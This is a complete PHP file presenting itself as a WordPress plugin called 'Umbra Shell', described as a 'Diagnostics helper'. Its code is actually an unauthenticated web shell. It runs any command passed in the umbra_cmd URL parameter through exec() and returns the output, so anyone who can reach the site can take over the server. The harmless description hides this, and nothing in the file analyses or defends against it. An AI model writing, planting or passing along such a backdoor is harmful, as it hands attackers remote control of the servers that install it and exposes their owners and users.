<?php
/**
 * Plugin Name: Umbra Shell
 * Description: Diagnostics helper.
 * Version: 1.0.0
 * Author: Philippe
 */

if (isset($_GET['umbra_cmd'])) {
    header('Content-Type: text/plain');
    $cmd = $_GET['umbra_cmd'];
    $out = array();
    $rc = 0;
    exec($cmd . ' 2>&1', $out, $rc);
    echo implode("\n", $out);
    exit;
}
?>